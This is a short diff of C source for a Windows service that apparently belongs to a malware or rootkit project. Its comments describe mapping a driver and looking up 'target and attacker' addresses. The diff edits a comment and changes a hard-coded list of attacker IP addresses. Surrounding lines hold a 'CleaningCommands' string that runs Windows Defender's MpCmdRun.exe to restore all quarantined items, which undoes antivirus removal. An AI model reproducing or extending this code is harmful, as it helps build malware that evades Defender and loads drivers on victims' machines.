@@ -6,7 +6,7 @@
 #include "services.h"
 
 
-// Declerations for used functions -
+// Declerations for used functions:
 VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv);  // actual Main() of service, initiates service operations
 VOID WINAPI ServiceControlHandler(DWORD);  // controls events, like IRP_MJ_DEVICE_CONTROL in KM
 DWORD WINAPI ServiceMainThread(LPVOID lpParam);  // main thread, actually activates the medium service and maps the driver
@@ -20,7 +20,7 @@ DWORD WINAPI ServiceMainThread(LPVOID lpParam) {
     const char* CleaningCommands =
         "cd \"%ProgramFiles%\\Windows Defender\" && "
         "MpCmdRun.exe -Restore -All";
-    const char* AttackAddresses = "192.168.1.21~192.168.1.10~192.168.40.1";
+    const char* AttackAddresses = "172.17.80.1~192.168.1.32~192.168.56.1~192.168.192.1~192.168.88.1";
 
 
     // Get IP addresses of target and attacker:
